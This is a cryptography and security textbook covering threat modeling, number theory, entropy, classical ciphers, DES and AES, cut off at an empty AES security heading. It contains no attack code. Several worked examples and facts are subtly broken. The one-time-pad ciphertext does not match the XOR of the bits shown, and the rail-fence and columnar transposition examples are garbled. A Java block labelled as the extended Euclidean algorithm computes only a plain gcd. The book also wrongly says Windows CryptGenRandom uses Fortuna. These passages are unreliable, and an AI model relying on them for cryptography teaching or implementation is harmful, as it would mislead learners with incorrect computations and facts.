# The Complete Guide to Cryptography, Network Security & Cybersecurity
## From Zero to Expert — A Comprehensive Reference Book

---

> **"Security is not a product, but a process."** — Bruce Schneier

---

## About This Book

This book is a complete, self-contained guide designed to take you from absolute beginner to expert-level practitioner in four interconnected disciplines:

1. **Cryptography** — the mathematics and algorithms of secrecy
2. **Security Fundamentals** — threat modeling, attack taxonomy, defense principles
3. **Computer Networks** — how data actually moves across the internet
4. **Network Security** — defending the infrastructure that connects the world

Each chapter builds on the previous. Mathematical concepts are introduced gently and reinforced with worked examples. Every major algorithm is explained in plain language before the formal definition. Real-world attacks and defenses are used throughout.

---

## Table of Contents

### PART I — FOUNDATIONS
- Chapter 1: The Security Mindset
- Chapter 2: Mathematics for Cryptography
- Chapter 3: Information Theory & Entropy
- Chapter 4: Classical Cryptography

### PART II — SYMMETRIC CRYPTOGRAPHY
- Chapter 5: Block Ciphers & DES
- Chapter 6: AES — The Advanced Encryption Standard
- Chapter 7: Modes of Operation
- Chapter 8: Stream Ciphers

### PART III — ASYMMETRIC CRYPTOGRAPHY
- Chapter 9: Public Key Cryptography & RSA
- Chapter 10: Elliptic Curve Cryptography
- Chapter 11: Diffie-Hellman & Key Exchange
- Chapter 12: Digital Signatures

### PART IV — CRYPTOGRAPHIC PROTOCOLS
- Chapter 13: Hash Functions & MACs
- Chapter 14: Key Derivation & Password Hashing
- Chapter 15: TLS/SSL — Securing the Web
- Chapter 16: PKI & X.509 Certificates
- Chapter 17: Advanced Protocols (Zero-Knowledge, MPC, Post-Quantum)

### PART V — COMPUTER NETWORKS
- Chapter 18: Networking Fundamentals & the OSI Model
- Chapter 19: Physical & Data Link Layer
- Chapter 20: IP Networking
- Chapter 21: TCP, UDP & Transport Layer
- Chapter 22: DNS, HTTP & Application Protocols
- Chapter 23: Routing & BGP

### PART VI — NETWORK SECURITY
- Chapter 24: Firewalls & Packet Filtering
- Chapter 25: Intrusion Detection & Prevention
- Chapter 26: VPNs & Tunneling
- Chapter 27: Wireless Security (Wi-Fi, WPA3, Bluetooth)
- Chapter 28: Network Attack Techniques
- Chapter 29: Web Application Security
- Chapter 30: Incident Response & Forensics

### PART VII — ADVANCED TOPICS
- Chapter 31: Cryptanalysis — Breaking Ciphers
- Chapter 32: Side-Channel Attacks
- Chapter 33: Post-Quantum Cryptography
- Chapter 34: Blockchain & Distributed Trust
- Chapter 35: Building Secure Systems

---

# PART I — FOUNDATIONS

---

# Chapter 1: The Security Mindset

## 1.1 What Is Security?

Security is the practice of protecting assets — data, systems, networks, and people — from unauthorized access, use, disclosure, disruption, modification, or destruction.

But security is not a binary state. Nothing is perfectly secure; everything has a cost to attack and a cost to defend. The goal of security engineering is to raise the cost of attack above the attacker's resources, while keeping the cost of defense within the defender's budget.

### The CIA Triad

The foundation of information security is the **CIA Triad**:

```
┌──────────────────────────────────────────────────┐
│                   CIA TRIAD                       │
│                                                  │
│         Confidentiality                          │
│              /\                                  │
│             /  \                                 │
│            /    \                                │
│           /      \                               │
│          /________\                              │
│    Integrity    Availability                     │
│                                                  │
└──────────────────────────────────────────────────┘
```

| Property | Definition | Example Attack | Example Control |
|----------|------------|----------------|-----------------|
| **Confidentiality** | Information is accessible only to authorized parties | Eavesdropping, data theft | Encryption, access control |
| **Integrity** | Information is accurate and unaltered | Man-in-the-middle, tampering | Digital signatures, MACs, hashing |
| **Availability** | Systems are accessible when needed | DDoS, ransomware | Redundancy, backups, rate limiting |

Beyond CIA, modern security adds:

- **Authentication** — verifying identity ("Are you who you claim to be?")
- **Authorization** — verifying permissions ("Are you allowed to do this?")
- **Non-repudiation** — preventing denial of actions ("You cannot deny you signed this.")
- **Accountability** — logging who did what and when

## 1.2 Threat Modeling

Threat modeling is the structured process of identifying what can go wrong and how to stop it. It answers four questions:

1. **What are we building?** — System decomposition
2. **What can go wrong?** — Threat enumeration
3. **What are we going to do about it?** — Mitigation
4. **Did we do a good enough job?** — Validation

### STRIDE Framework

Developed by Microsoft, STRIDE categorizes threats:

| Threat | Violated Property | Example |
|--------|------------------|---------|
| **S**poofing | Authentication | Faking a sender address |
| **T**ampering | Integrity | Modifying a database record |
| **R**epudiation | Non-repudiation | Denying you sent a transaction |
| **I**nformation Disclosure | Confidentiality | SQL injection leaking data |
| **D**enial of Service | Availability | Flood attack overwhelming a server |
| **E**levation of Privilege | Authorization | Exploiting a buffer overflow to get root |

### Attack Trees

An attack tree is a hierarchical diagram showing how an attacker can achieve a goal. The root is the attacker's goal; leaves are attack methods.

```
Goal: Steal Customer Credit Card Data
├── Attack the Database
│   ├── SQL Injection
│   ├── Steal DBA credentials
│   └── Exploit unpatched DB vulnerability
├── Intercept Network Traffic
│   ├── ARP Poisoning
│   └── Compromise TLS (e.g., rogue cert)
└── Social Engineer an Employee
    ├── Phishing email
    └── Phone pretexting
```

## 1.3 The Attacker's Perspective

Understanding your enemy is the first principle of defense. Attackers are categorized by:

**By Motivation:**
- Nation-state actors (APTs — Advanced Persistent Threats)
- Organized crime (financial gain)
- Hacktivists (ideological)
- Insiders (disgruntled employees, negligent users)
- Script kiddies (opportunistic, low skill)

**By Position (the Kill Chain):**

The Lockheed Martin Cyber Kill Chain describes the stages of an attack:

```
1. Reconnaissance    → Gathering information about the target
2. Weaponization     → Creating an exploit payload
3. Delivery          → Delivering the weapon (email, USB, web)
4. Exploitation      → Triggering the vulnerability
5. Installation      → Installing a backdoor/RAT
6. Command & Control → Establishing C2 communication
7. Actions on Objectives → Exfiltrate data, encrypt files, etc.
```

Breaking the kill chain at any stage stops the attack. Defense in depth means having controls at every stage.

## 1.4 Security Principles

These core principles guide secure system design:

### Principle of Least Privilege
Every user, program, and system should operate with the minimum privileges necessary to complete its task. A web server process should not run as root. A user account for reading reports should not have write access.

### Defense in Depth
Do not rely on a single security control. Layer multiple controls so that failure of one does not compromise the entire system. (Firewalls + IDS + encryption + access control + monitoring, not just firewalls.)

### Fail Secure (Fail Closed)
When a system fails, it should default to a secure state. A firewall that crashes should block all traffic, not allow all traffic.

### Open Design (Kerckhoffs's Principle)
The security of a system should depend on the secrecy of the **key**, not the secrecy of the **algorithm**. Assume the attacker knows everything about your algorithm. This is why "security through obscurity" alone fails.

> **Kerckhoffs's Principle (1883):** A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.

### Economy of Mechanism
Keep designs simple. Complex systems have more ways to fail. Every extra feature is a potential attack surface.

### Complete Mediation
Every access to every resource must be checked for authorization. Cache carefully — cached permissions can become stale.

### Separation of Privilege
Require multiple conditions to be satisfied before granting access. Two-factor authentication is the classic example.

### Psychological Acceptability
Security measures must be usable. If a security control is too inconvenient, users will bypass it. The best security is the security people actually use.

## 1.5 Risk Management

Risk is the combination of **threat**, **vulnerability**, and **impact**:

```
Risk = Threat × Vulnerability × Impact
```

**Risk Treatment Options:**
- **Accept** — live with the risk (low impact or too costly to fix)
- **Mitigate** — implement controls to reduce likelihood or impact
- **Transfer** — buy insurance, outsource to a third party
- **Avoid** — stop doing the risky activity entirely

### Common Vulnerability Scoring System (CVSS)

CVSS provides a numerical score (0–10) for vulnerabilities:

| Score | Severity |
|-------|----------|
| 0.0 | None |
| 0.1–3.9 | Low |
| 4.0–6.9 | Medium |
| 7.0–8.9 | High |
| 9.0–10.0 | Critical |

CVSS considers: Attack vector, complexity, privileges required, user interaction, scope, and impact on CIA.

---

# Chapter 2: Mathematics for Cryptography

Cryptography is applied mathematics. This chapter covers the essential mathematical foundations.

## 2.1 Modular Arithmetic

Modular arithmetic is the mathematics of remainders. `a mod n` is the remainder when `a` is divided by `n`.

```
17 mod 5 = 2    (17 = 3×5 + 2)
23 mod 7 = 2    (23 = 3×7 + 2)
100 mod 13 = 9  (100 = 7×13 + 9)
```

### Properties of Modular Arithmetic

```
(a + b) mod n = ((a mod n) + (b mod n)) mod n
(a × b) mod n = ((a mod n) × (b mod n)) mod n
(a - b) mod n = ((a mod n) - (b mod n)) mod n
```

### Modular Inverse

The modular inverse of `a` modulo `n` is the number `a⁻¹` such that:
```
a × a⁻¹ ≡ 1 (mod n)
```

Example: `3⁻¹ mod 7 = 5` because `3 × 5 = 15 ≡ 1 (mod 7)`

The modular inverse exists if and only if `gcd(a, n) = 1` (they are coprime).

## 2.2 Euclidean Algorithm

The Greatest Common Divisor (GCD) of two numbers is fundamental in cryptography.

**Standard Euclidean Algorithm:**
```
gcd(48, 18):
  48 = 2 × 18 + 12
  18 = 1 × 12 + 6
  12 = 2 × 6 + 0
  → gcd(48, 18) = 6
```

**Extended Euclidean Algorithm** — finds integers x, y such that `ax + by = gcd(a,b)`:

```java


import java.math.BigInteger;

public class Main {

    public static BigInteger gcd(BigInteger a, BigInteger b) {
        if (b.equals(BigInteger.ZERO))
            return a;

        return gcd(b, a.mod(b));
    }

    public static void main(String[] args) {

        BigInteger a = new BigInteger("48");
        BigInteger b = new BigInteger("18");

        System.out.println(gcd(a, b));
    }
}

// Example: gcd(35, 15) with coefficients:
// 35 × 1 + 15 × (-2) = 5   ← gcd is 5
// BigInteger.valueOf(35) used in: extendedGcd(BigInteger.valueOf(35), BigInteger.valueOf(15))

// Modular inverse via Java's built-in:
// BigInteger modInverse = BigInteger.valueOf(17).modInverse(BigInteger.valueOf(3120));
```

Used to compute modular inverses: if `gcd(a, n) = 1`, then `a⁻¹ ≡ x (mod n)`.

## 2.3 Prime Numbers

A prime number is divisible only by 1 and itself. Primes are the atoms of number theory and the foundation of most public-key cryptography.

**Key properties:**
- There are infinitely many primes (Euclid's theorem)
- Every integer > 1 has a unique prime factorization (Fundamental Theorem of Arithmetic)
- Finding the prime factors of a large number is computationally hard → basis of RSA

### Fermat's Little Theorem

If `p` is prime and `gcd(a, p) = 1`, then:
```
a^(p-1) ≡ 1 (mod p)
```

This is used in RSA, primality testing, and modular exponentiation.

### Euler's Theorem

Generalizes Fermat's Little Theorem. For `gcd(a, n) = 1`:
```
a^φ(n) ≡ 1 (mod n)
```

Where `φ(n)` is **Euler's totient function** — the count of integers from 1 to n that are coprime with n.

```
φ(p) = p - 1             for prime p
φ(p×q) = (p-1)(q-1)     for distinct primes p, q
φ(12) = 4                (1, 5, 7, 11 are coprime with 12)
```

### Miller-Rabin Primality Test

Used to efficiently test if a number is (probably) prime:

1. Write `n-1 = 2^r × d` where `d` is odd
2. Choose a random `a` with `2 ≤ a ≤ n-2`
3. Compute `x = a^d mod n`
4. If `x = 1` or `x = n-1`, declare probably prime
5. Repeat squaring: if we reach `n-1`, declare probably prime
6. Otherwise, declare composite

Running with k rounds gives a false positive probability of at most `4^(-k)`.

## 2.4 Groups, Rings, and Fields

These abstract algebraic structures underlie all of modern cryptography.

### Groups

A **group** (G, ★) is a set G with a binary operation ★ satisfying:
- **Closure**: a ★ b ∈ G for all a, b ∈ G
- **Associativity**: (a ★ b) ★ c = a ★ (b ★ c)
- **Identity**: there exists e such that a ★ e = a
- **Inverse**: for every a, there exists a⁻¹ such that a ★ a⁻¹ = e

If also **commutative** (a ★ b = b ★ a), it's an **abelian group**.

Examples:
- (ℤ, +) — integers under addition
- (ℤₙ*, ×) — integers coprime to n under multiplication mod n
- Points on an elliptic curve under point addition

### Cyclic Groups and Discrete Logarithm

A group is **cyclic** if all elements can be generated by repeatedly applying the operation to a single element g (the **generator** or **primitive root**).

```
g = 3 in ℤ₇*:
3¹ = 3
3² = 9 mod 7 = 2
3³ = 6
3⁴ = 18 mod 7 = 4
3⁵ = 5
3⁶ = 1
→ 3 generates all of {1, 2, 3, 4, 5, 6}
```

The **Discrete Logarithm Problem (DLP)**: Given g, h, and n, find x such that `gˣ ≡ h (mod n)`.

This is easy in one direction (exponentiation is fast) and believed to be hard in the other (finding x from h) — the **one-way** property that secures DH and DSA.

### Fields

A **field** (F, +, ×) is a set where both addition and multiplication form groups (with some conditions). Examples: ℚ (rationals), ℝ (reals), GF(2ⁿ) — Galois fields used in AES.

**GF(2)** is the simplest field: {0, 1} with XOR as addition and AND as multiplication.

**GF(2⁸)** is the field used in AES's SubBytes operation — polynomials of degree < 8 with coefficients in {0,1}.

## 2.5 Probability and Information Theory Basics

### Birthday Problem / Birthday Attack

If you randomly sample from a set of N possibilities, you need approximately `√N` samples before a collision (two samples being equal) is likely.

This has profound implications for cryptography:
- A hash function with 128-bit output has 2^128 possible values
- You only need about 2^64 samples to find a collision with good probability
- This is why hash functions for collision resistance need **double** the bit length of their security parameter

**Birthday Bound:** In a set of N elements, a collision occurs with ~50% probability after `√(π×N/2) ≈ 1.25√N` samples.

### XOR Properties

XOR (exclusive OR, ⊕) is fundamental in cryptography:

```
A ⊕ 0 = A          (identity)
A ⊕ A = 0          (self-inverse)
A ⊕ B = B ⊕ A      (commutative)
(A ⊕ B) ⊕ C = A ⊕ (B ⊕ C)  (associative)
```

One-time pad encryption: `C = P ⊕ K`, decryption: `P = C ⊕ K`

## 2.6 Computational Complexity

Cryptographic security relies on problems being "hard" to solve. We measure hardness with complexity classes.

| Notation | Meaning | Example (n = key size in bits) |
|----------|---------|-------------------------------|
| O(1) | Constant | Array lookup |
| O(log n) | Logarithmic | Binary search |
| O(n) | Linear | Scanning a list |
| O(n²) | Quadratic | Naive matrix multiply |
| O(2^n) | Exponential | Brute-force key search |
| O(n!) | Factorial | Traveling salesman |

**Polynomial time** algorithms (O(nᵏ)) are considered "efficient." Cryptographic problems should have no known polynomial-time solution.

### Security Levels

| Bits of Security | Operations to Break | Current Status (2024) |
|-----------------|--------------------|-----------------------|
| 56 | 2^56 ≈ 7×10^16 | Broken (DES) |
| 80 | 2^80 ≈ 10^24 | Weak (avoid) |
| 112 | 2^112 | Acceptable short-term |
| 128 | 2^128 | Recommended minimum |
| 192 | 2^192 | Post-quantum safe (approx) |
| 256 | 2^256 | Long-term secure |

---

# Chapter 3: Information Theory & Entropy

## 3.1 Shannon's Information Theory

Claude Shannon's 1948 paper "A Mathematical Theory of Communication" founded both information theory and modern cryptography. Shannon showed that information can be quantified and that there are fundamental limits on compression and security.

### Entropy

**Shannon entropy** measures the unpredictability of a random variable X:

```
H(X) = -Σ p(xᵢ) × log₂(p(xᵢ))
```

- Entropy is measured in **bits**
- Higher entropy = more unpredictable = more information
- Maximum entropy of an n-bit string: n bits (uniform distribution)
- Minimum entropy: 0 bits (the outcome is certain)

**Example:**
A fair coin: H = -(0.5×log₂0.5 + 0.5×log₂0.5) = -2×(0.5×(-1)) = **1 bit**

A loaded coin (90% heads): H = -(0.9×log₂0.9 + 0.1×log₂0.1) ≈ **0.469 bits**

### Why Entropy Matters for Cryptography

A key with low entropy is easy to guess:
- "password123" ≈ 18 bits of entropy (lowercase + digits, short)
- A random 128-bit key has exactly 128 bits of entropy
- The key MUST have at least as much entropy as the security level you want

**Password entropy** is why length matters more than complexity:
- "correct horse battery staple" (4 random words) ≈ 44 bits
- "P@$$w0rd!" ≈ 18 bits

## 3.2 Perfect Secrecy

Shannon defined **perfect secrecy**: a cipher is perfectly secret if the ciphertext reveals nothing about the plaintext — even to an adversary with unlimited computational power.

**Formally:** For all plaintexts m and ciphertexts c:
```
P(M = m | C = c) = P(M = m)
```

Seeing the ciphertext doesn't change your belief about the plaintext.

### The One-Time Pad

Shannon proved the one-time pad (OTP) is the *only* cipher achieving perfect secrecy.

**How it works:**
1. Generate a key K of the same length as the message M
2. K must be truly random
3. Encrypt: C = M ⊕ K
4. Decrypt: M = C ⊕ K
5. **Never reuse the key**

**Example:**
```
Plaintext:  HELLO         01001000 01000101 01001100 01001100 01001111
Key:        XMCKL  →      01011000 01001101 01000011 01001011 01001100
Ciphertext: 35 08 1F 07 03
```

**Why OTP is impractical:**
- The key must be as long as the message
- Keys can never be reused (if they are, XOR cancels them: C₁⊕C₂ = M₁⊕M₂)
- Distributing the key securely is as hard as distributing the message

**Why OTP matters:**
It proves that perfect security is theoretically achievable. All practical ciphers trade perfect security for efficiency and key reuse, using computational hardness assumptions.

## 3.3 Computational Security

Since perfect secrecy is impractical, we settle for **computational security**: a cipher is computationally secure if breaking it requires an infeasible amount of computation (more than an attacker can perform in a reasonable time).

### Security Definitions

**IND-CPA (Indistinguishability under Chosen Plaintext Attack):**
An adversary who can encrypt chosen plaintexts cannot distinguish the encryption of two messages they choose. This requires **randomized encryption** — the same plaintext must encrypt to different ciphertexts each time.

**IND-CCA2 (Adaptive Chosen Ciphertext Attack):**
An adversary who can decrypt any ciphertext except the target cannot determine what the target decrypts to. This is the gold standard for asymmetric encryption.

**Semantic Security:**
An adversary cannot learn any partial information about the plaintext from the ciphertext.

## 3.4 Pseudorandom Number Generators

True randomness is expensive. Cryptography uses **Cryptographically Secure Pseudorandom Number Generators (CSPRNGs)**.

A CSPRNG must satisfy:
1. **Unpredictability forward**: outputs look random, even knowing all previous outputs
2. **Unpredictability backward**: knowing current state doesn't reveal past outputs (backtracking resistance)
3. **Seeded by true entropy**: typically from OS entropy sources

**OS Entropy Sources:**
- Hardware random number generators (Intel RDRAND, ARM TrueRNG)
- Mouse movements, keyboard timing
- Network packet timing
- Disk I/O timing

**In Linux:** `/dev/random` (blocks when entropy is low) and `/dev/urandom` (never blocks, uses CSPRNG)

**Common CSPRNGs:**
- **Fortuna** (used in Windows CryptGenRandom)
- **ChaCha20-based** (used in Linux kernel since 5.17, OpenBSD)
- **HMAC-DRBG** (NIST SP 800-90A)

**⚠️ Never use `rand()` or `Math.random()` for cryptographic purposes.** These are not CSPRNGs.

---

# Chapter 4: Classical Cryptography

## 4.1 History and Context

Cryptography is ancient. Before computers, encryption was done by hand using simple substitutions and transpositions. Understanding classical ciphers builds intuition for how and why modern ciphers work the way they do.

## 4.2 Caesar Cipher

The simplest substitution cipher. Each letter is shifted by a fixed amount (the key).

```
Key = 3
Plaintext:  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
Ciphertext: D E F G H I J K L M N O P Q R S T U V W X Y Z A B C

Plaintext:  HELLO
Ciphertext: KHOOR
```

**Encryption:** `C = (P + k) mod 26`
**Decryption:** `P = (C - k) mod 26`

**Breaking it:** Only 25 possible keys. Try all 25. This is a **brute force** attack. It takes microseconds.

## 4.3 Substitution Cipher

Instead of shifting, replace each letter with any other letter. The key is a permutation of the alphabet.

```
Plain:  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
Cipher: Q W E R T Y U I O P A S D F G H J K L Z X C V B N M
```

**Key space:** 26! ≈ 4×10²⁶ possible keys — far too large for brute force.

**But it's easily broken by frequency analysis.**

### Frequency Analysis (Al-Kindi, 9th century)

In English text, letters appear with known frequencies:

```
E: 12.7%   T: 9.1%   A: 8.2%   O: 7.5%   I: 7.0%
N: 6.7%    S: 6.3%   H: 6.1%   R: 6.0%   D: 4.3%
```

In a long ciphertext, the most frequent ciphertext letter corresponds to E, second most frequent to T, and so on. With a few guesses, the whole cipher unravels.

**Lesson:** Large key spaces don't make a cipher secure if the structure of the plaintext leaks through the cipher.

## 4.4 Vigenère Cipher

To defeat frequency analysis, use a **polyalphabetic** cipher. The Vigenère cipher uses a keyword to select different Caesar shifts.

```
Key:       CRYPTO (repeated: CRYPTOCRYPTOCRYP...)
Plaintext: ATTACK AT DAWN

A (shift C=2): C
T (shift R=17): K
T (shift Y=24): R
A (shift P=15): P
C (shift T=19): V
K (shift O=14): Y

Ciphertext: CKRPVY...
```

**Encryption:** `C_i = (P_i + K_(i mod m)) mod 26`

Where m is the key length.

**Breaking Vigenère — Kasiski Test:**
1. Find repeated patterns in the ciphertext
2. The distances between repetitions are likely multiples of the key length
3. GCD of distances = probable key length
4. Once key length k is known, divide ciphertext into k groups
5. Each group is a Caesar cipher — apply frequency analysis

**Index of Coincidence (IC):**
```
IC = Σ (nᵢ × (nᵢ-1)) / (N × (N-1))
```
English IC ≈ 0.065; random text IC ≈ 0.038.
Using IC to find key length is called the **Friedman test**.

## 4.5 Playfair Cipher

Encrypts digraphs (pairs of letters) instead of single letters, making simple frequency analysis harder.

**Key setup:**
1. Fill a 5×5 grid with a keyword (no repeats), then remaining alphabet (I=J)
2. The grid becomes the cipher key

**Encryption rules for pair (A, B):**
- Same row: each shifts right one
- Same column: each shifts down one
- Different row and column: each takes the letter in same row but other's column (rectangle rule)

## 4.6 Transposition Ciphers

Instead of substituting letters, rearrange them.

**Rail Fence Cipher:**
```
Plaintext:  WEAREDISCOVEREDRUNATONCE
Depth 3:
W . . . E . . . I . . . V . . . D . . . U . . . T . . . E
. E . R . D . S . O . E . E . R . N . A . O . C .
. . A . . . . . C . . . . . . . . . A . . . . . N .

Read rows: WEIERDACRSOEERUNATOETCE → WEIDUVTENRDSOEERNAOCAC...
```

**Columnar Transposition:**
Write the message in rows, read off in column order (determined by key).

```
Key:      3 1 4 2
Plaintext:
A T T A
C K A T
D A W N

Column order (1,2,3,4): K A N | T A W | A T D | A A ...
Ciphertext: KAN TAW ATD AA...
```

## 4.7 The Enigma Machine

The Enigma machine (Germany, WWII) was a polyalphabetic cipher machine using rotating electrical rotors. It was the most complex cipher of its era — and its breaking by Alan Turing and others at Bletchley Park changed history.

**How Enigma worked:**
1. Operator presses a key
2. Current flows through a plugboard (substitution)
3. Through 3-5 rotors (each a substitution, position shifts with each keypress)
4. Through a reflector (guaranteed a ≠ b)
5. Back through rotors in reverse
6. Lights up a ciphertext letter

**Key space:** ~10^23 — too large for brute force, but the machine had a fundamental flaw: **a letter could never encrypt to itself** (due to the reflector). This was exploited in Turing's **Bombe** machine.

**Lessons from Enigma:**
- Operational security failures often matter more than cryptanalysis
- Reusing settings (weather reports always started the same way) gave cribs
- Even brilliant mathematics needs to be combined with good key management

## 4.8 Why Classical Ciphers Fail

All classical ciphers fail for one or more of these reasons:

| Weakness | Example Cipher | Modern Solution |
|----------|---------------|-----------------|
| Too few keys (brute force) | Caesar (25 keys) | 128+ bit keys (2^128 possibilities) |
| Structure preserved (frequency analysis) | Substitution | Confusion + diffusion (modern block ciphers) |
| Short key period exposed by statistics | Vigenère | Key as long as output (stream ciphers) or per-block expansion |
| Ciphertext malleability | All classical | MACs and authenticated encryption |

Shannon's principles for secure ciphers:
- **Confusion**: Make the relationship between key and ciphertext as complex as possible (substitution)
- **Diffusion**: Spread the influence of each plaintext bit over many ciphertext bits (permutation)

Modern ciphers (AES, ChaCha20) apply layers of confusion and diffusion through multiple rounds, making any statistical relationship cryptographically negligible.

---

---

# PART II — SYMMETRIC CRYPTOGRAPHY

---

# Chapter 5: Block Ciphers & DES

## 5.1 Block Cipher Fundamentals

A **block cipher** is a deterministic algorithm that encrypts a fixed-size block of bits (the **block size**) using a fixed-size key. It is a **pseudorandom permutation (PRP)** — for a given key, it maps each possible input block to a unique output block.

```
Encrypt: E_k: {0,1}^n → {0,1}^n   (where n = block size)
Decrypt: D_k: {0,1}^n → {0,1}^n   (inverse of E_k)
```

**Key properties:**
- **Deterministic**: same key + same plaintext always = same ciphertext
- **Invertible**: every ciphertext block decrypts to exactly one plaintext block
- **Efficient**: both E_k and D_k run in polynomial time
- **Secure**: without the key, E_k looks like a random permutation

**Common block sizes and key sizes:**

| Cipher | Block Size | Key Size | Status |
|--------|-----------|----------|--------|
| DES | 64 bits | 56 bits | **Broken** |
| 3DES | 64 bits | 112/168 bits | Legacy |
| AES-128 | 128 bits | 128 bits | Secure |
| AES-256 | 128 bits | 256 bits | Secure |
| Blowfish | 64 bits | 32-448 bits | Legacy |
| Twofish | 128 bits | 128/192/256 | Not widely used |

## 5.2 The Data Encryption Standard (DES)

DES was the dominant cipher from 1977 to the late 1990s. Understanding DES is essential because:
1. It introduced the Feistel structure used by many modern ciphers
2. Its weaknesses motivated AES
3. 3DES is still encountered in legacy systems

### DES Parameters
- **Block size**: 64 bits
- **Key size**: 64 bits (but only 56 are actually used; 8 bits are parity)
- **Rounds**: 16
- **Structure**: Feistel network

### The Feistel Network

The Feistel structure is elegant: you only need to implement encryption, not decryption separately. Decryption uses the same structure with subkeys in reverse order.

```
          64-bit block
         /             \
        L₀              R₀
        |               |
        ├───────────────→ f(R₀, K₁)
        |               |
        R₁ = L₀ ⊕ f(R₀,K₁)   L₁ = R₀
        |               |
        ├───────────────→ f(L₁, K₂)
        ...16 rounds...
        |               |
        └───────────────┘
              64-bit ciphertext
```

At each round:
```
L_i = R_{i-1}
R_i = L_{i-1} ⊕ f(R_{i-1}, K_i)
```

The round function f doesn't need to be invertible because decryption just reverses:
```
R_{i-1} = L_i
L_{i-1} = R_i ⊕ f(L_i, K_{i})
```

### DES Round Function

The round function f takes a 32-bit half-block and a 48-bit subkey:

```
1. Expansion (E): 32 bits → 48 bits (some bits duplicated)
2. XOR with subkey: 48 bits ⊕ 48-bit subkey
3. S-Boxes: 8 × 6-bit → 4-bit substitutions → 32 bits
4. Permutation (P): 32-bit permutation
```

**S-Boxes** are the heart of DES. Each S-box is a 4×16 lookup table that provides nonlinearity — without them, DES would be a linear cipher breakable with a tiny amount of known plaintext.

### DES Key Schedule

The 56-bit key generates 16 × 48-bit subkeys:
1. Permuted Choice 1 (PC-1): selects 56 bits from 64-bit key
2. Split into two 28-bit halves (C, D)
3. For each round, rotate C and D left by 1 or 2 positions
4. Permuted Choice 2 (PC-2): selects 48 bits from 56

### Why DES Is Broken

**56-bit key space = 2^56 ≈ 72 quadrillion keys**

In 1998, EFF's "Deep Crack" machine cracked DES in 22 hours for $250,000.
Today, FPGAs can break DES in minutes. The key is simply too short.

**Differential Cryptanalysis** (Biham & Shamir, 1990):
- Analyzes how differences in plaintext pairs propagate to differences in ciphertext
- Theoretical attack on DES needs 2^47 chosen plaintexts
- DES's designers knew about this attack in 1974 — the S-boxes were specifically designed to resist it

**Linear Cryptanalysis** (Matsui, 1993):
- Finds linear approximations of the round function
- Full DES broken with 2^43 known plaintexts

## 5.3 Triple DES (3DES/TDEA)

A stop-gap solution: apply DES three times to increase effective key length.

```
Encrypt: C = E_{K3}(D_{K2}(E_{K1}(P)))
Decrypt: P = D_{K1}(E_{K2}(D_{K3}(C)))
```

**Why EDE (Encrypt-Decrypt-Encrypt) instead of EEE?**
When K1 = K2 = K3, 3DES reduces to single DES — backward compatibility.

**3DES modes:**
- **3-key 3DES (K1≠K2≠K3)**: 168-bit key, ~112 bits effective security
- **2-key 3DES (K1=K3≠K2)**: 112-bit key, ~80 bits effective security

**Sweet32 Attack (2016)**: The 64-bit block size of 3DES allows birthday attacks after 2^32 blocks (~32 GB of data). After Sweet32, 3DES should be avoided in new designs.

---

# Chapter 6: AES — The Advanced Encryption Standard

## 6.1 AES History and Selection

In 1997, NIST held an open competition for a new block cipher to replace DES. Five finalists competed: Rijndael, Serpent, Twofish, RC6, and MARS. In 2001, NIST selected **Rijndael** as AES.

AES (FIPS 197) is the most widely deployed cipher in the world. It runs on everything from hardware security modules to TLS connections to disk encryption.

## 6.2 AES Parameters

| Version | Key Size | Rounds |
|---------|----------|--------|
| AES-128 | 128 bits | 10 |
| AES-192 | 192 bits | 12 |
| AES-256 | 256 bits | 14 |

**Block size**: always 128 bits

## 6.3 AES Architecture — Substitution-Permutation Network (SPN)

Unlike DES's Feistel network, AES uses a Substitution-Permutation Network. The entire 128-bit block is treated as a 4×4 matrix of bytes (**State**).

```
State matrix (4×4 bytes = 128 bits):
┌──┬──┬──┬──┐
│a₀│a₄│a₈│a₁₂│
│a₁│a₅│a₉│a₁₃│
│a₂│a₆│a₁₀│a₁₄│
│a₃│a₇│a₁₁│a₁₅│
└──┴──┴──┴──┘
```

### The 4 AES Operations

**1. SubBytes (Confusion)**

Each byte is replaced using the **AES S-Box** — an 8-bit substitution based on the multiplicative inverse in GF(2⁸) followed by an affine transformation.

```java
// AES S-Box lookup table (first row shown):
private static final int[] SBOX = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76  // ... (256 entries total)
};

// SubBytes: replace each byte of state using the S-Box
static void subBytes(int[][] state) {
    for (int i = 0; i < 4; i++)
        for (int j = 0; j < 4; j++)
            state[i][j] = SBOX[state[i][j]];
}
// Note: In practice, use javax.crypto.Cipher with "AES" — never implement AES manually
```

The S-Box was designed to have:
- No fixed points (s(x) ≠ x)
- No opposite fixed points (s(x) ≠ x̄)
- Maximum nonlinearity (resistance to linear cryptanalysis)
- Minimum differential uniformity (resistance to differential cryptanalysis)

**2. ShiftRows (Diffusion)**

Each row is cyclically shifted left by its row index:

```
Row 0: no shift   [a₀ a₄  a₈  a₁₂]   → [a₀  a₄  a₈  a₁₂]
Row 1: shift 1    [a₁ a₅  a₉  a₁₃]   → [a₅  a₉  a₁₃ a₁]
Row 2: shift 2    [a₂ a₆  a₁₀ a₁₄]  → [a₁₀ a₁₄ a₂  a₆]
Row 3: shift 3    [a₃ a₇  a₁₁ a₁₅]  → [a₁₅ a₃  a₇  a₁₁]
```

**3. MixColumns (Diffusion)**

Each column is multiplied by a fixed 4×4 matrix in GF(2⁸):

```
[2 3 1 1]   [s₀]   [s'₀]
[1 2 3 1] × [s₁] = [s'₁]  (in GF(2⁸))
[1 1 2 3]   [s₂]   [s'₂]
[3 1 1 2]   [s₃]   [s'₃]
```

MixColumns ensures that every input byte affects every output byte — providing the **avalanche effect**: changing 1 bit of input changes ~50% of output bits.

**4. AddRoundKey (Key Integration)**

The 128-bit round key is XORed with the state:
```
state[i][j] ^= roundKey[i][j]
```

### Full AES Encryption

```
Initial Round:
  AddRoundKey(state, key[0])

Rounds 1...(Nr-1):
  SubBytes(state)
  ShiftRows(state)
  MixColumns(state)
  AddRoundKey(state, key[round])

Final Round:
  SubBytes(state)
  ShiftRows(state)
  AddRoundKey(state, key[Nr])    ← no MixColumns in final round
```

### AES Key Schedule

The key schedule expands the initial key into (Nr+1) × 128-bit round keys using SubBytes, rotation, and XOR with round constants (Rcon).

## 6.4 AES Security

